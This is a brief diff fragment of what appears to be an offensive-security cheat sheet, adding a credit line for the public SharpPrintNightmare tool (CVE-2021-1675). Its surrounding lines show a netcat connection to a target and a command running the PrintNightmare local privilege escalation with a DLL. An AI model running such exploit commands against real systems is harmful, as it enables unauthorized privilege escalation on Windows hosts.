@@ -78,6 +78,7 @@ nc <target> 8282
 
 ### SharpPrintNightmare.exe
 ```
+* **NullByte** - *CVE-2021-1675* - [SharpPrintNightmare](https://github.com/cube0x0/CVE-2021-1675)
  #LPE
 C:\SharpPrintNightmare.exe C:\addCube.dll
 
